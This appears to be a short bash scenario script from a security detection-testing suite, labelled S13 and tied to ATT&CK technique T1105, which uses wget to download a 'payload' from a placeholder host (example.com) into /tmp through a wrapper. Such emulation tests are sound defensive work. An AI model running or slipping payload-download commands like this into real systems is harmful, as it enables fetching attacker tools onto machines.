#!/usr/bin/env bash
# S13 - download a payload to /tmp (T1105).
set -uo pipefail
source "$(dirname "$0")/_lib.sh"
vexec sh -c 'timeout 10 wget -q -O /tmp/payload.sh https://example.com/ || true' || true
